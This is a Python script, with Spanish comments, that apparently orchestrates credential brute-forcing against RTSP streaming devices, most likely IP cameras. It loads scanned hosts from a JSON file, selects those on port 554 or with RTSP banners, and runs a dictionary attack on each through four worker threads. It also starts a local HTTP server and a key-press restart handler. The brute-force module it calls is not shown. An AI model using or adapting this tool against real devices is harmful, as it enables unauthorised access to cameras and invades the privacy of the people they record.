import os
import sys
import json
import time
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
from queue import Queue

from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos

class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexión abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

def monitor_update_key():
    # Función para detectar la pulsación de 'U' sin necesidad de presionar Enter
    if os.name == 'nt':
        import msvcrt
        while True:
            print("Presiona 'U' para actualizar el script", end='\r')
            if msvcrt.kbhit():
                ch = msvcrt.getch()
                try:
                    char = ch.decode('utf-8')
                except:
                    char = ch
                if char.upper() == 'U':
                    print("\nActualizando script...")
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            time.sleep(0.1)
    else:
        import select, tty, termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setcbreak(sys.stdin.fileno())
            while True:
                print("Presiona 'U' para actualizar el script", end='\r')
                dr, dw, de = select.select([sys.stdin], [], [], 0)
                if dr:
                    ch = sys.stdin.read(1)
                    if ch.upper() == 'U':
                        print("\nActualizando script...")
                        time.sleep(1)
                        os.execv(sys.executable, [sys.executable] + sys.argv)
                time.sleep(0.1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

if __name__ == '__main__':
    # Iniciar actualización de datos
    threading.Thread(target=actualizar_datos, daemon=True).start()

    # Iniciar servidor HTTP
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    # Monitorizar la tecla 'U' sin necesidad de presionar Enter
    threading.Thread(target=monitor_update_key, daemon=True).start()

    json_file = 'datos.json'
    data = cargar_datos()

    targets = [(entry['IP'], entry['Puerto'])
               for entry in data
               if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    q = Queue()
    for target in targets:
        q.put(target)

    dictionary_file = "diccionario.txt"
    num_worker_threads = 4
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    q.join()
    server_thread.join()
